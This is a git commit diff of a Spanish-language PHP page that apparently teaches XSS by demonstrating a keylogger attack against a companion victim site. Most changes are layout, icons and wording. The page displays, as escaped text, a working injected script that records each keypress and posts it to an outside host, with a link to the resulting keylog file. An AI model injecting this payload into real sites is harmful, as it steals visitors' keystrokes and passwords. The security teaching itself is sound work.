faff1dbf521d55118964d7af401f67d258aae748
Fernando Walpert <walllpapert@gmail.com>
2025-09-04 10:50:16 -0300

    cambios
    - mejora responsive
    - mejora redacción
    - añadido favicon

--- index.php
+++ index.php
@@ -5,8 +5,8 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-rbsA2VBKQhggwzxH7pPCaAqO46MgnOM80zW1RWuH61DGLwZJEdK2Kadq2F9CUG65" crossorigin="anonymous">
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4" crossorigin="anonymous"></script>
+    <link rel="icon" type="image/x-icon" href="favicon.png">
     <title>Ciberseguridad</title>
-
     <style>
         em{
             background-color: #c9c9c9ff;
@@ -14,12 +14,20 @@
             display: block;
             font-family: monospace;
             padding: 10px;
+            overflow-x: auto;           /* Agrega scroll horizontal si es necesario */
+            max-width: 100%;            /* Limita el ancho al contenedor padre */
+            box-sizing: border-box;     /* Incluye el padding en el ancho */
         }
     </style>
 </head>
 <body class="bg-dark">
     <div class="container mt-5 bg-light rounded p-5 col-lg-8">
-        <h1 class="mb-4">Seguridad: Ataque XSS</h1>
+        <h1 class="mb-4">
+            <svg xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor" class="bi bi-lock-fill" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"/>
+            </svg>
+            Seguridad: Prueba de ataque XSS
+        </h1>
         <p>
             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-bullseye" viewBox="0 0 16 16">
                 <path d="M8 15A7 7 0 1 1 8 1a7 7 0 0 1 0 14m0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16"/>
@@ -27,32 +35,21 @@
                 <path d="M8 11a3 3 0 1 1 0-6 3 3 0 0 1 0 6m0 1a4 4 0 1 0 0-8 4 4 0 0 0 0 8"/>
                 <path d="M9.5 8a1.5 1.5 0 1 1-3 0 1.5 1.5 0 0 1 3 0"/>
             </svg>
-            Objetivo: Simular un ataque XSS a aun sitio web vulnerable para instalar un keylogger y obtener información sensible.
+            Objetivo: Simular un ataque de inyección de código (XSS) a aun sitio web vulnerable para instalar un keylogger y obtener información sensible.
         </p>
         <p>
-            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-lock-fill" viewBox="0 0 16 16">
-                <path fill-rule="evenodd" d="M8 0a4 4 0 0 1 4 4v2.05a2.5 2.5 0 0 1 2 2.45v5a2.5 2.5 0 0 1-2.5 2.5h-7A2.5 2.5 0 0 1 2 13.5v-5a2.5 2.5 0 0 1 2-2.45V4a4 4 0 0 1 4-4m0 1a3 3 0 0 0-3 3v2h6V4a3 3 0 0 0-3-3"/>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-exclamation-triangle-fill" viewBox="0 0 16 16">
+                <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5m.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2"/>
             </svg>
             ¿Qué es un <strong>Ataque XSS</strong>?
             <br>
             Un ataque XSS (Cross-Site Scripting) es un tipo de vulnerabilidad de seguridad web que permite a un atacante inyectar código malicioso (generalmente scripts) en un sitio web legítimo para que se ejecute en el navegador del usuario que visita el sitio. Los atacantes usan XSS para robar información sensible como las cookies de sesión, redirigir a los usuarios a sitios maliciosos, desfigurar páginas o robar credenciales. 
         </p>
         <p>
-            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-exclamation-triangle-fill" viewBox="0 0 16 16">
-                <path d="M8.982 1.566a1.13 1.13 0 0 0-1.96 0L.165 13.233c-.457.778.091 1.767.98 1.767h13.713c.889 0 1.438-.99.98-1.767zM8 5c.535 0 .954.462.9.995l-.35 3.507a.552.552 0 0 1-1.1 0L7.1 5.995A.905.905 0 0 1 8 5m.002 6a1 1 0 1 1 0 2 1 1 0 0 1 0-2"/>
-            </svg>    
-            <strong>Código malicioso</strong>
-            <br>
-            Este <strong>keylogger</strong> se inyecta en el navegador de la víctima y registra cada pulsación de tecla, enviando la información a un servidor controlado por el atacante.
-            <br>
-            Las teclas que presionen los visitantes serán registradas en el siguiente archivo <a href="web_hacker/keylog.txt" target="_blank">keylog.txt</a> que se encuentra en la web del atacante.
-            <em>
-            <?php
-                echo htmlspecialchars(
-                    "<script>document.onkeypress = function(evt) {evt = evt || window.event;const key = String.fromCharCode(evt.charCode);if (key) {const param = encodeURI(key);fetch('../web_hacker/index.php', {method: 'POST',headers: {'Content-type': 'application/x-www-form-urlencoded'},body: 'key=' + param});}};</script>"
-                );
-            ?>
-            </em>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-incognito" viewBox="0 0 16 16">
+                <path fill-rule="evenodd" d="m4.736 1.968-.892 3.269-.014.058C2.113 5.568 1 6.006 1 6.5 1 7.328 4.134 8 8 8s7-.672 7-1.5c0-.494-1.113-.932-2.83-1.205l-.014-.058-.892-3.27c-.146-.533-.698-.849-1.239-.734C9.411 1.363 8.62 1.5 8 1.5s-1.411-.136-2.025-.267c-.541-.115-1.093.2-1.239.735m.015 3.867a.25.25 0 0 1 .274-.224c.9.092 1.91.143 2.975.143a30 30 0 0 0 2.975-.143.25.25 0 0 1 .05.498c-.918.093-1.944.145-3.025.145s-2.107-.052-3.025-.145a.25.25 0 0 1-.224-.274M3.5 10h2a.5.5 0 0 1 .5.5v1a1.5 1.5 0 0 1-3 0v-1a.5.5 0 0 1 .5-.5m-1.5.5q.001-.264.085-.5H2a.5.5 0 0 1 0-1h3.5a1.5 1.5 0 0 1 1.488 1.312 3.5 3.5 0 0 1 2.024 0A1.5 1.5 0 0 1 10.5 9H14a.5.5 0 0 1 0 1h-.085q.084.236.085.5v1a2.5 2.5 0 0 1-5 0v-.14l-.21-.07a2.5 2.5 0 0 0-1.58 0l-.21.07v.14a2.5 2.5 0 0 1-5 0zm8.5-.5h2a.5.5 0 0 1 .5.5v1a1.5 1.5 0 0 1-3 0v-1a.5.5 0 0 1 .5-.5"/>
+            </svg>
+            La prueba consiste en aprovechar una vulnerabilidad del sitio web de la víctima y mediante <strong>inyección JavaScript</strong> en el formulario de comentarios se coloca un fragmento de código malicioso (keylogger), que luego es ejecutado por el sitio al mostrar los comentarios.
         </p>
         <p>
             <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-keyboard" viewBox="0 0 16 16">
@@ -61,20 +58,29 @@
             </svg>
             ¿Qué es un <strong>keylogger</strong>?
             <br>
-            Un keylogger es un software o dispositivo que registra secretamente cada pulsación de teclas en una computadora o dispositivo móvil, capturando contraseñas, información personal y datos bancarios para enviarlos a un tercero. 
-            <br>
-            Son una forma peligrosa de spyware que puede usarse para cometer fraude, robo de identidad y otros delitos. 
+            Un keylogger es un software o dispositivo que registra secretamente cada pulsación de teclas en una computadora o dispositivo móvil, capturando contraseñas, información personal y datos bancarios para enviarlos a un tercero. Son una forma peligrosa de spyware que puede usarse para cometer fraude, robo de identidad y otros delitos. 
         </p>
         <p>
-            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-incognito" viewBox="0 0 16 16">
-                <path fill-rule="evenodd" d="m4.736 1.968-.892 3.269-.014.058C2.113 5.568 1 6.006 1 6.5 1 7.328 4.134 8 8 8s7-.672 7-1.5c0-.494-1.113-.932-2.83-1.205l-.014-.058-.892-3.27c-.146-.533-.698-.849-1.239-.734C9.411 1.363 8.62 1.5 8 1.5s-1.411-.136-2.025-.267c-.541-.115-1.093.2-1.239.735m.015 3.867a.25.25 0 0 1 .274-.224c.9.092 1.91.143 2.975.143a30 30 0 0 0 2.975-.143.25.25 0 0 1 .05.498c-.918.093-1.944.145-3.025.145s-2.107-.052-3.025-.145a.25.25 0 0 1-.224-.274M3.5 10h2a.5.5 0 0 1 .5.5v1a1.5 1.5 0 0 1-3 0v-1a.5.5 0 0 1 .5-.5m-1.5.5q.001-.264.085-.5H2a.5.5 0 0 1 0-1h3.5a1.5 1.5 0 0 1 1.488 1.312 3.5 3.5 0 0 1 2.024 0A1.5 1.5 0 0 1 10.5 9H14a.5.5 0 0 1 0 1h-.085q.084.236.085.5v1a2.5 2.5 0 0 1-5 0v-.14l-.21-.07a2.5 2.5 0 0 0-1.58 0l-.21.07v.14a2.5 2.5 0 0 1-5 0zm8.5-.5h2a.5.5 0 0 1 .5.5v1a1.5 1.5 0 0 1-3 0v-1a.5.5 0 0 1 .5-.5"/>
+            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-bug" viewBox="0 0 16 16">
+                <path d="M4.355.522a.5.5 0 0 1 .623.333l.291.956A5 5 0 0 1 8 1c1.007 0 1.946.298 2.731.811l.29-.956a.5.5 0 1 1 .957.29l-.41 1.352A5 5 0 0 1 13 6h.5a.5.5 0 0 0 .5-.5V5a.5.5 0 0 1 1 0v.5A1.5 1.5 0 0 1 13.5 7H13v1h1.5a.5.5 0 0 1 0 1H13v1h.5a1.5 1.5 0 0 1 1.5 1.5v.5a.5.5 0 1 1-1 0v-.5a.5.5 0 0 0-.5-.5H13a5 5 0 0 1-10 0h-.5a.5.5 0 0 0-.5.5v.5a.5.5 0 1 1-1 0v-.5A1.5 1.5 0 0 1 2.5 10H3V9H1.5a.5.5 0 0 1 0-1H3V7h-.5A1.5 1.5 0 0 1 1 5.5V5a.5.5 0 0 1 1 0v.5a.5.5 0 0 0 .5.5H3c0-1.364.547-2.601 1.432-3.503l-.41-1.352a.5.5 0 0 1 .333-.623M4 7v4a4 4 0 0 0 3.5 3.97V7zm4.5 0v7.97A4 4 0 0 0 12 11V7zM12 6a4 4 0 0 0-1.334-2.982A3.98 3.98 0 0 0 8 2a3.98 3.98 0 0 0-2.667 1.018A4 4 0 0 0 4 6z"/>
             </svg>
-            El ataque consiste en aprovechar una vulnerabilidad del sitio web de la víctima y mediante <strong>inyección JavaScript</strong> en el formulario de comentarios se coloca un fragmento de código malicioso (keylogger), que luego es ejecutado por el sitio al mostrar los comentarios.
+            Código malicioso
+            <br>
+            Una vez este <i>keylogger</i> es inyectado en la caja de comentarios del sitio web de la víctima, este registra cada pulsación de tecla que realicen los visitantes del sitio y envía la información a un servidor controlado por el atacante.
+            <br>
+            <em>
+            <?php
+                echo htmlspecialchars(
+                    "<script>document.onkeypress = function(evt) {evt = evt || window.event;const key = String.fromCharCode(evt.charCode);if (key) {const param = encodeURI(key);fetch('https://proyectosfm1.x10host.com/Ejemplos/AtaqueXSS/web_hacker/index.php', {method: 'POST',headers: {'Content-type': 'application/x-www-form-urlencoded'},body: 'key=' + param});}};</script>"
+                );
+            ?>
+            </em>
+            Las teclas que presionen los visitantes serán registradas en el siguiente archivo <a href="https://proyectosfm1.x10host.com/Ejemplos/AtaqueXSS/web_hacker/keylog.txt" target="_blank"><strong>keylog.txt</strong></a> que se encuentra en la web del atacante.
         </p>
         <hr>
         <a href="https://www.youtube.com/watch?v=w8pwVx_kIig" target="_blank">Fuente</a>
         <div class="row">
-            <a class="btn btn-dark mx-auto col-md-4 mt-5" href="web_victima/index.php">Iniciar</a>
+            <a class="btn btn-dark mx-auto col-md-4 mt-5" href="web_victima/index.php">Iniciar prueba</a>
         </div>
     </div>
 </body>
